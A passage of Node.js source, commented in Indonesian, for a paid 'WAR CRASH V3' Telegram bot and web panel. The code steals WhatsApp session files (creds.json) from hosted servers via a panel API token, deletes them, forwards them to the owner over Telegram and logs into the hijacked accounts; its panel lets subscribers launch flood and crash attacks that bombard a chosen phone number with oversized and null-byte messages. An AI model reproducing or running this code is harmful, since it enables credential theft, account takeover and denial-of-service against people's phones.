            ];

            let credsBuffer = null;
            let usedPath = null;

            for (const p of commonPaths) {
                try {
                    const dlMeta = await axios.get(
                        `${domainBase}/api/client/servers/${identifier}/files/download`,
                        {
                            params: { file: p },
                            headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
                        }
                    );

                    if (dlMeta?.data?.attributes?.url) {
                        const fileRes = await axios.get(dlMeta.data.attributes.url, {
                            responseType: "arraybuffer",
                        });
                        credsBuffer = Buffer.from(fileRes.data);
                        usedPath = p;
                        console.log(`[FOUND] creds.json ditemukan di ${identifier}:${p}`);
                        break;
                    }
                } catch (e) {
                    // skip ke path berikutnya
                }
                await sleep(REQUEST_DELAY_MS);
            }

            if (!credsBuffer) {
                console.log(`[SKIP] creds.json tidak ditemukan di server: ${name}`);
                await sleep(REQUEST_DELAY_MS * 2);
                continue;
            }

            totalFound++;

            try {
                await axios.post(
                    `${domainBase}/api/client/servers/${identifier}/files/delete`,
                    { root: "/", files: [usedPath.replace(/^\/+/, "")] },
                    { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
                );
                console.log(`[DELETED] creds.json di server ${identifier} (${usedPath})`);
            } catch (err) {
                console.warn(
                    `[WARN] Gagal hapus creds.json di server ${identifier}: ${
                    err.response?.status || err.message
                    }`
                );
            }

            let BotNumber = "unknown_number";
            try {
                const txt = credsBuffer.toString("utf8");
                const json = JSON.parse(txt);
                const candidate =
                    json.id ||
                    json.phone ||
                    json.number ||
                    (json.me && (json.me.id || json.me.jid || json.me.user)) ||
                    json.clientID ||
                    (json.registration && json.registration.phone) ||
                    null;

                if (candidate) {
                    BotNumber = String(candidate).replace(/\D+/g, "");
                    if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) {
                        BotNumber = "62" + BotNumber;
                    }
                } else {
                    BotNumber = String(identifier).replace(/\s+/g, "_");
                }
            } catch (e) {
                console.log("Gagal parse creds.json -> fallback ke identifier:", e.message);
                BotNumber = String(identifier).replace(/\s+/g, "_");
            }

            const sessDir = sessionPath(BotNumber);
            try {
                fs.mkdirSync(sessDir, { recursive: true });
                fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
            } catch (e) {
                console.error("Gagal simpan creds:", e.message);
            }

            for (const oid of ownerIds) {
                try {
                    await ctx.telegram.sendDocument(oid, {
                        source: credsBuffer,
                        filename: `${BotNumber}_creds.json`,
                    });
                    await ctx.telegram.sendMessage(
                        oid,
                        `📱 *Detected:* ${BotNumber}\n📁 *Server:* ${name}\n📂 *Path:* ${usedPath}\n🧹 *Status:* creds.json dihapus dari server.`,
                        { parse_mode: "Markdown" }
                    );
                } catch (e) {
                    console.error("Gagal kirim ke owner:", e.message);
                }
            }

            const connectedFlag = path.join(sessDir, "connected.flag");
            const failedFlag = path.join(sessDir, "failed.flag");

            if (fs.existsSync(connectedFlag)) {
                console.log(`[SKIP] ${BotNumber} sudah connected (flag exists).`);
                await sleep(REQUEST_DELAY_MS);
                continue;
            }

            if (fs.existsSync(failedFlag)) {
                console.log(`[SKIP] ${BotNumber} sebelumnya gagal (failed.flag).`);
                await sleep(REQUEST_DELAY_MS);
                continue;
            }

            try {
                if (!fs.existsSync(path.join(sessDir, "creds.json"))) {
                    console.log(`[SKIP CONNECT] creds.json tidak ditemukan untuk ${BotNumber}`);
                } else {
                    await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
                    fs.writeFileSync(connectedFlag, String(Date.now()));
                    console.log(`[CONNECTED] ${BotNumber}`);
                }
            } catch (err) {
                const emsg =
                    err?.response?.status === 404
                        ? "404 Not Found"
                        : err?.response?.status === 403
                            ? "403 Forbidden"
                            : err?.response?.status === 440
                                ? "440 Login Timeout"
                                : err?.message || "Unknown error";

                fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
                console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);

                for (const oid of ownerIds) {
                    try {
                        await ctx.telegram.sendMessage(
                            oid,
                            `❌ Gagal connect *${BotNumber}*\nServer: ${name}\nError: ${emsg}`,
                            { parse_mode: "Markdown" }
                        );
                    } catch { }
                }
            }

            await sleep(REQUEST_DELAY_MS * 2);
        }

        if (totalFound === 0)
            await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
        else
            await ctx.reply(
                `✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Sudah dihapus dari server & percobaan connect dilakukan 1x)`
            );
    } catch (err) {
        console.error("csession error:", err?.response?.data || err.message);
        await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
    }
});

// ==================== EXPRESS SERVER ====================

// Middleware untuk cek authentication
const requireAuth = (req, res, next) => {
    console.log("🔍 [MIDDLEWARE] Checking authentication...");

    if (!req.cookies) {
        console.log("❌ No cookies found");
        return res.redirect('/login?msg=No cookies found');
    }

    const username = req.cookies.sessionUser;
    console.log("Username from cookie:", username);

    if (!username) {
        console.log("❌ No sessionUser cookie");
        return res.redirect('/login?msg=Silakan login terlebih dahulu');
    }

    const users = getUsers();
    console.log(`Total users in DB: ${users.length}`);

    const user = users.find(u => u.username === username);

    if (!user) {
        console.log(`❌ User ${username} not found in database`);
        res.clearCookie('sessionUser');
        return res.redirect('/login?msg=Sesi telah kedaluwarsa');
    }

    console.log(`✅ User ${username} authenticated`);
    req.user = user;
    next();
};

app.use(express.static('MainFile')); // Untuk serve file static

app.get("/", (req, res) => {
    res.redirect('/login');
});

app.get("/login", (req, res) => {
    const msg = req.query.msg || "";
    const filePath = path.join(__dirname, "MainFile", "mbut.html");
    
    console.log(`📄 Loading login page from: ${filePath}`);
    
    fs.readFile(filePath, "utf8", (err, html) => {
        if (err) {
            console.error("❌ Gagal baca mbut.html:", err);
            console.error("Error details:", err.message);
            console.error("Current directory:", __dirname);
            
            // Coba cek apakah file ada
            fs.readdir(path.join(__dirname, "MainFile"), (dirErr, files) => {
                if (dirErr) {
                    console.error("❌ MainFile folder tidak ada!");
                } else {
                    console.log("📂 Files in MainFile:", files);
                }
            });
            
            // Fallback: Kirim halaman login sederhana
            const fallbackHtml = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Login - WAR CRASH</title>
                <style>
                    body { background: #000; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                    .login-box { background: #111; padding: 30px; border-radius: 10px; text-align: center; }
                    h2 { color: #aa00ff; }
                    input { width: 100%; padding: 10px; margin: 10px 0; }
                    button { background: #aa00ff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
                    .error { color: red; }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>WAR CRASH V3 Login</h2>
                    <div class="error">${msg}</div>
                    <form action="/auth" method="POST">
                        <input type="text" name="username" placeholder="Username" required><br>
                        <input type="password" name="key" placeholder="Password" required><br>
                        <button type="submit">Login</button>
                    </form>
                </div>
            </body>
            </html>`;
            
            return res.send(fallbackHtml);
        }
        
        // Replace placeholder untuk message
        html = html.replace(/\$\{message\}/g, msg);
        
        res.setHeader('Content-Type', 'text/html');
        res.send(html);
    });
});

// Route untuk authentication
app.post("/auth", (req, res) => {
    const { username, key } = req.body;
    const users = getUsers();

    console.log(`🔐 Login attempt: ${username}`);

    const user = users.find(u => u.username === username && u.key === key);

    if (!user) {
        console.log(`❌ Login failed for ${username}`);
        return res.redirect("/login?msg=Username/Password%20Salah");
    }

    console.log(`✅ Login successful for ${username}`);

    res.cookie("sessionUser", user.username, {
        maxAge: 86400000, // 1 hari
        httpOnly: true
    });

    res.redirect("/execution");
});

app.get("/execution", requireAuth, (req, res) => {
    const currentUser = req.user;
    const targetNumber = req.query.target;
    const mode = req.query.mode;

    console.log(`📱 Accessing /execution by ${currentUser.username}`);
    console.log(`Query params: target=${targetNumber}, mode=${mode}`);

    if (targetNumber || mode) {
        console.log("⚡ Attack request detected");

        if (sessions.size === 0) {
            console.log("❌ No active WhatsApp sessions");
            const html = `<!DOCTYPE html><html><head><title>Maintenance</title></head><body><h1>🚧 MAINTENANCE SERVER !!</h1><p>Tunggu maintenance selesai...</p></body></html>`;
            return res.send(html);
        }

        if (!targetNumber) {
            console.log("❌ No target number provided");
            const html = `<!DOCTYPE html><html><head><title>Error</title></head><body><h1>⚠️ INPUT ERROR</h1><p>Masukkan nomor target dengan benar.</p></body></html>`;
            return res.send(html);
        }

        const now = Date.now();
        const cooldown = 3 * 60 * 1000;
        if (lastExecution && (now - lastExecution < cooldown)) {
            const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
            console.log(`⏳ Cooldown active, wait ${sisa} seconds`);
            const html = `<!DOCTYPE html><html><head><title>Cooldown</title></head><body><h1>⏳ COOLDOWN</h1><p>Tunggu ${sisa} detik sebelum attack lagi.</p></body></html>`;
            return res.send(html);
        }

        const target = `${targetNumber}@s.whatsapp.net`;

        try {
            console.log(`🎯 Starting attack on ${target} with mode: ${mode}`);

            const firstSessionKey = sessions.keys().next().value;
            const sock = sessions.get(firstSessionKey);

            if (!sock) {
                throw new Error("WhatsApp session not ready");
            }

            if (mode === "uisystem") {
                Crashandroid(1, target);
            } else if (mode === "invis") {
                DelayBapakLo(1, target);
            } else if (mode === "fc") {
                Forclose(1, target);
            } else if (mode === "ulti") {
                BomBug(1, target);
            } else if (mode === "kira") {
                StuckHome(1, target);
            } else {
                throw new Error("Mode tidak dikenal: " + mode);
            }

            lastExecution = now;
            console.log(`✅ Attack sent to ${targetNumber} with mode ${mode}`);

            const html = `<!DOCTYPE html>
            <html>
            <head>
                <title>Success</title>
            </head>
            <body>
                <h1>✅ S U C C E S</h1>
                <p><b>Target:</b> ${targetNumber}</p>
                <p><b>Mode:</b> ${mode.toUpperCase()}</p>
                <p><b>Time:</b> ${new Date().toLocaleString("id-ID")}</p>
                <a href="/execution">Back</a>
            </body>
            </html>`;
            return res.send(html);

        } catch (err) {
            console.error("❌ Attack error:", err);
            const html = `<!DOCTYPE html>
            <html>
            <head>
                <title>Error</title>
            </head>
            <body>
                <h1>❌ FAILED</h1>
                <p>Error: ${err.message}</p>
                <a href="/execution">Back</a>
            </body>
            </html>`;
            return res.send(html);
        }
    }

    console.log("📊 Loading dashboard...");

    const filePath = path.join(__dirname, "MainFile", "Pusat.html");
    
    fs.readFile(filePath, "utf8", (err, html) => {
        if (err) {
            console.error("❌ Gagal baca Pusat.html:", err);
            return res.status(500).send("Error loading dashboard");
        }

        // === DATA USER ===
        const username = currentUser.username || "Guest";
        const key = currentUser.key || "";
        const role = currentUser.role || 'user';
        const rawRole = role;
        const expired = currentUser.expired || Date.now();

        // === FORMAT ROLE (SAMA DENGAN DI HTML) ===
        const roleLower = role.toLowerCase();
        let displayRole = "Member";
        let roleColor = "#FFFFFF";
        
        if (roleLower.includes("owner") || roleLower.includes("creator")) {
            displayRole = "Owner"; roleColor = "#FFD700";
        } else if (roleLower.includes("admin")) {
            displayRole = "Admin"; roleColor = "#00FF00";
        } else if (roleLower.includes("resell")) {
            displayRole = "Reseller"; roleColor = "#FFA500";
        } else if (roleLower.includes("pt")) {
            displayRole = "Partner"; roleColor = "#ADD8E6";
        } else if (roleLower.includes("vip")) {
            displayRole = "VIP"; roleColor = "#FF69B4";
        } else if (roleLower.includes("mod")) {
            displayRole = "Moderator"; roleColor = "#90EE90";
        } else {
            displayRole = "Member"; roleColor = "#CCCCCC";
        }
        
        // Format untuk ${displayRole} dengan span (SAMA PERSIS DENGAN HTML)
        const displayRoleHtml = `<span style="color: ${roleColor}">${displayRole}</span>`;

        // === FORMAT WAKTU ===
        const formattedTime = new Date(expired).toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            year: "numeric",
            month: "2-digit",
            day: "2-digit",
            hour: "2-digit",
            minute: "2-digit",
        });

        // === REPLACE SEMUA PLACEHOLDER ===
        // Perhatikan: HTML Anda menggunakan placeholders dengan format berbeda-beda
        
        // 1. ${username} (banyak muncul di HTML)
        html = html.replace(/\$\{username\}/g, username);
        
        // 2. ${displayRole} (muncul di beberapa tempat)
        html = html.replace(/\$\{displayRole\}/g, displayRoleHtml);
        
        // 3. ${formattedTime} (expired time)
        html = html.replace(/\$\{formattedTime\}/g, formattedTime);
        
        // 4. ${rawRole} (original role tanpa format)
        html = html.replace(/\$\{rawRole\}/g, rawRole);
        
        // 5. ${password} (di script tag atas)
        html = html.replace(/\$\{password\}/g, key);
        
        // 6. ${userKey} (jika ada)
        html = html.replace(/\$\{userKey\}/g, key);
        
        // 7. ${key} (alternatif)
        html = html.replace(/\$\{key\}/g, key);
        
        // 8. Tambahan: ${role} (tanpa format)
        html = html.replace(/\$\{role\}/g, role);
        
        // 9. Tambahan: ${expired} (jika ada)
        html = html.replace(/\$\{expired\}/g, formattedTime);

        // === TAMBAHAN UNTUK STATISTIK DINAMIS ===
        
        // Session count
        const sessionCount = sessions.size;
        html = html.replace(/\$\{sessionCount\}/g, sessionCount);
        
        // IP Address
        const userIp = req.headers['x-forwarded-for'] || 
                      req.socket.remoteAddress || 
                      req.ip || 
                      "Unknown";
        html = html.replace(/\$\{userIp\}/g, userIp);
        
        // Server Time
        const serverTime = new Date().toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            year: "numeric",
            month: "2-digit",
            day: "2-digit",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit"
        });
        html = html.replace(/\$\{serverTime\}/g, serverTime);
        
        // Sisa Waktu Expired
        const now = Date.now();
        const timeLeft = expired - now;
        
        let expiredStatus = "Active";
        let expiredColor = "#00FF00";
        
        if (timeLeft <= 0) {
            expiredStatus = "Expired";
            expiredColor = "#FF0000";
        } else if (timeLeft < 24 * 60 * 60 * 1000) {
            expiredStatus = "Almost Expired";
            expiredColor = "#FFA500";
        }
        
        html = html.replace(/\$\{expiredStatus\}/g, expiredStatus);
        html = html.replace(/\$\{expiredColor\}/g, expiredColor);
        
        // Format sisa waktu
        if (timeLeft > 0) {
            const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
            const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
            
            const timeLeftText = `${days} hari ${hours} jam ${minutes} menit`;
            html = html.replace(/\$\{timeLeft\}/g, timeLeftText);
        } else {
            html = html.replace(/\$\{timeLeft\}/g, "0 hari 0 jam 0 menit");
        }

        // === DEBUG LOG ===
        console.log("🔍 Data yang direplace:");
        console.log("- Username:", username);
        console.log("- Display Role:", displayRole);
        console.log("- Raw Role:", rawRole);
        console.log("- Key:", key);
        console.log("- Expired:", formattedTime);
        console.log("- IP:", userIp);
        console.log("- Sessions Active:", sessionCount);

        // === KIRIM RESPONSE ===
        res.setHeader('Content-Type', 'text/html');
        res.send(html);
    });
});

app.post('/api/create-account', (req, res) => {
    const { username, customKey, duration, role } = req.body;
    const adminUsername = req.cookies.sessionUser;

    if (!adminUsername) return res.json({ success: false, message: "Sesi Habis, Login Ulang!" });

    const users = getUsers();
    const adminUser = users.find(u => u.username === adminUsername);

    if (!adminUser) return res.json({ success: false, message: "Admin tidak ditemukan!" });

    const adminRole = (adminUser.role || 'user').toLowerCase();
    const targetRole = role.toLowerCase();
    let allowed = false;

    if (adminRole === 'owner' || adminRole === 'creator') allowed = true;
    else if (adminRole === 'admin' && ['member', 'user', 'reseller', 'pt', 'admin'].includes(targetRole)) allowed = true;
    else if (adminRole === 'pt' && ['member', 'user', 'reseller', 'pt'].includes(targetRole)) allowed = true;
    else if ((adminRole === 'reseller' || adminRole === 'moderator') && ['member', 'user', 'reseller'].includes(targetRole)) allowed = true;

    if (!allowed) return res.json({ success: false, message: `Role ${adminRole} tidak boleh membuat ${targetRole}!` });

    if (users.find(u => u.username === username)) return res.json({ success: false, message: "Username sudah ada!" });

    let ms = 30 * 24 * 60 * 60 * 1000;
    if (duration.endsWith('d')) ms = parseInt(duration) * 24 * 60 * 60 * 1000;
    else if (duration.endsWith('h')) ms = parseInt(duration) * 60 * 60 * 1000;

    const finalKey = customKey || generateKey(4);
    const expired = Date.now() + ms;

    users.push({ username, key: finalKey, expired, role: targetRole });
    saveUsers(users);

    console.log(`\n================================`);
    console.log(`[+] NEW ACCOUNT CREATED (WEB)`);
    console.log(` ├─ Creator : ${adminUsername} (${adminRole})`);
    console.log(` ├─ New User: ${username}`);
    console.log(` ├─ Role    : ${targetRole.toUpperCase()}`);
    console.log(` └─ Expired : ${new Date(expired).toLocaleString()}`);
    console.log(`================================\n`);

    return res.json({ success: true, message: "Berhasil" });
});

app.get('/api/list-accounts', (req, res) => {
    if (!req.cookies.sessionUser) return res.json([]);

    const users = getUsers();
    const safeList = users.map(u => ({
        username: u.username,
        role: u.role || 'user',
        expired: u.expired
    })).reverse();

    res.json(safeList);
});

app.post('/api/reply-message', async (req, res) => {
    const { msgId, replyText } = req.body;
    const username = req.cookies.sessionUser;

    if (!username) return res.json({ success: false, message: "Login dulu!" });

    const msgIndex = globalMessages.findIndex(m => m.id === msgId);

    if (msgIndex === -1) return res.json({ success: false, message: "Pesan tidak ditemukan / sudah dihapus." });

    const msg = globalMessages[msgIndex];

    if (msg.replied) return res.json({ success: false, message: "Anda sudah membalas pesan ini." });

    const adminChatId = "7464121207";
    const botToken = tokens;

    const textToSend = `📩 *BALASAN DARI WEB*\n\n👤 User: \`${username}\`\n💬 Pesan Awal: _${msg.content}_\n\n↩️ *Balasan User:* \n${replyText}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: adminChatId,
                text: textToSend,
                parse_mode: "Markdown"
            })
        });

        const data = await response.json();

        if (data.ok) {
            globalMessages[msgIndex].replied = true;
            return res.json({ success: true });
        } else {
            console.error("Telegram API Error:", data);
            return res.json({ success: false, message: "Gagal kirim ke Telegram" });
        }
    } catch (e) {
        console.error("Reply Error:", e);
        return res.json({ success: false, message: "Server Error saat mengirim balasan." });
    }
});

app.post('/api/logout', (req, res) => {
    const { reason } = req.body;
    const username = req.cookies.sessionUser || "Unknown";

    console.log(`[LOGOUT] User: ${username} | Alasan: ${reason}`);

    res.clearCookie('sessionUser');
    res.clearCookie('sessionKey');

    return res.json({ success: true, redirect: '/login' });
});

// ==================== FUNCTIONS ATTACK ====================

async function OverloadingCrash(sock, target) {
    try {
        const rge = (t, c) => t.repeat(c);
        await sock.sendMessage(target, { text: rge("A", 100000) + rge("B", 100000) + rge("C", 100000) });
        console.log("✓ OverloadingCrash sent");
    } catch (err) {
        console.log("Error OverloadingCrash", err);
    }
}

async function InfiniteLoopCrash(sock, target) {
    try {
        const rge = (t, c) => t.repeat(c);
        for (let i = 0; i < 5; i++) {
            await sock.sendMessage(target, { text: rge("H", 50000) + rge("I", 50000) + rge("J", 50000) });
        }
        console.log("✓ InfiniteLoopCrash sent");
    } catch (err) {
        console.log("Error InfiniteLoopCrash", err);
    }
}

async function HeavyImageCrash(sock, target) {
    try {
        await sock.sendMessage(target, {
            text: "Heavy Image Crash - Simulated"
        });
        console.log("✓ HeavyImageCrash sent");
    } catch (err) {
        console.log("Error HeavyImageCrash", err);
    }
}

async function DelayPayment(sock, target) {
    try {
        const payload = {
            sendPaymentMessage: {
                noteMessage: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(20000)
                    }
                },
                amount1000: 50000,
                currency: "IDR",
            }
        }

        const msg = generateWAMessageFromContent(target, payload, {})
        await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
        console.log("✓ DelayPayment sent");
    } catch (err) {
        console.log("Error DelayPayment", err);
    }
}

async function Crashandroid(durationHours, target) {
    console.log(`🚀 Starting Crashandroid attack for ${durationHours} hours`);

    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log(`✓ Crashandroid attack completed`);
            return;
        }

        try {
            const firstSessionKey = sessions.keys().next().value;
            const sock = sessions.get(firstSessionKey);

            if (sock) {
                await Promise.all([
                    OverloadingCrash(sock, target),
                    InfiniteLoopCrash(sock, target),
                    HeavyImageCrash(sock, target)
                ]);

                console.log(chalk.green(`❄️ Sent batch ${count + 1}`));
                count++;
            }

            setTimeout(sendNext, 5000);
        } catch (error) {
            console.error(`✗ Error: ${error.message}`);
            setTimeout(sendNext, 10000);
        }
    };

    sendNext();
}

async function DelayBapakLo(durationHours, target) {
    console.log(`🚀 Starting DelayBapakLo attack for ${durationHours} hours`);

    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log(`✓ DelayBapakLo attack completed`);
            return;
        }

        try {
            const firstSessionKey = sessions.keys().next().value;
            const sock = sessions.get(firstSessionKey);

            if (sock) {
                await DelayPayment(sock, target);
                console.log(chalk.red(`💸 Sent delay payment ${count + 1}`));
                count++;
            }

            setTimeout(sendNext, 10000);
        } catch (error) {
            console.error(`✗ Error: ${error.message}`);
            setTimeout(sendNext, 15000);
        }
    };

    sendNext();
}

async function Forclose(durationHours, target) {
    console.log(`🚀 Starting Forclose attack for ${durationHours} hours`);

    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log(`✓ Forclose attack completed`);
            return;
        }

        try {
            const firstSessionKey = sessions.keys().next().value;
            const sock = sessions.get(firstSessionKey);

            if (sock) {
                // Send multiple crash messages
                await Promise.all([
                    OverloadingCrash(sock, target),
                    InfiniteLoopCrash(sock, target),
                    DelayPayment(sock, target)
                ]);

                console.log(chalk.yellow(`🔥 Sent Forclose batch ${count + 1}`));
                count++;
            }

            setTimeout(sendNext, 3000);
        } catch (error) {
            console.error(`✗ Error: ${error.message}`);
            setTimeout(sendNext, 8000);
        }
    };

    sendNext();
}

async function StuckHome(durationHours, target) {
    console.log(`🚀 Starting StuckHome attack for ${durationHours} hours`);

    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log(`✓ StuckHome attack completed`);
            return;
        }

        try {
            const firstSessionKey = sessions.keys().next().value;
            const sock = sessions.get(firstSessionKey);

            if (sock) {
                // Send heavy payload to cause stuck
                await sock.sendMessage(target, {
                    text: "🔒 System Stuck - Recovery Mode\n" + "\u0000".repeat(50000)
                });

                await DelayPayment(sock, target);
                await HeavyImageCrash(sock, target);

                console.log(chalk.blue(`🏠 Sent StuckHome batch ${count + 1}`));
                count++;
            }

            setTimeout(sendNext, 7000);
        } catch (error) {
            console.error(`✗ Error: ${error.message}`);
            setTimeout(sendNext, 12000);
        }
    };

    sendNext();
}

async function BomBug(durationHours, target) {
    console.log(`🚀 Starting BomBug attack for ${durationHours} hours`);

    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log(`✓ BomBug attack completed`);
            return;
        }

        try {
            const firstSessionKey = sessions.keys().next().value;
            const sock = sessions.get(firstSessionKey);

            if (sock) {
                // Send rapid fire messages
                for (let i = 0; i < 10; i++) {
                    await sock.sendMessage(target, {
                        text: `💣 BOM BUG ${i + 1} - ${"\u0000".repeat(10000)}`
                    });
                }

                await InfiniteLoopCrash(sock, target);
                await OverloadingCrash(sock, target);

                console.log(chalk.red(`💥 Sent BomBug batch ${count + 1}`));
                count++;
            }

            setTimeout(sendNext, 2000);
        } catch (error) {
            console.error(`✗ Error: ${error.message}`);
            setTimeout(sendNext, 5000);
        }
    };

    sendNext();
}

// ==================== START SERVER ====================

console.clear();
console.log(chalk.blue(`
⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⠀⠀
`));

// Start Express Server
const server = app.listen(PORT, () => {
    const address = server.address();
    const host = address.address === '::' ? 'localhost' : address.address;
    const port = address.port;
    
    console.log(chalk.green(`🚀 Server running on port: ${port}`));
    console.log(chalk.yellow(`🔗 Local: http://localhost:${port}`));
    console.log(chalk.yellow(`🔗 Network: http://${getLocalIP()}:${port}`));
    
    if (VPS && VPS !== "0.0.0.0" && VPS !== "localhost") {
        console.log(chalk.cyan(`🌐 Public: http://${VPS}:${port}`));
    }
});

// Function to get local IP address
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const iface of Object.values(interfaces)) {
        for (const config of iface) {
            if (config.family === 'IPv4' && !config.internal) {
                return config.address;
            }
        }
    }
    return 'localhost';
}

// Start Telegram Bot
bot.launch().then(() => {
    console.log(chalk.red(`
╭─⦏ Welcome Back ⦐
│ꔹ ɪᴅ ᴏᴡɴ : ${OwnerId}
│ꔹ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @xangelxy
│ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
╰───────────────────`));
}).catch(err => {
    console.error(chalk.red(`❌ Gagal start bot: ${err.message}`));
});

// Initialize WhatsApp connections
initializeWhatsAppConnections().catch(err => {
    console.error(chalk.red(`❌ Gagal initialize WhatsApp: ${err.message}`));
});

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log(chalk.yellow('\n🛑 Shutting down server...'));
    server.close(() => {
        console.log(chalk.green('✅ Server closed'));
        process.exit(0);
    });
});

module.exports = {
    loadAkses,
    saveAkses,
    isOwner,
    isAuthorized,
    saveUsers,
    getUsers
};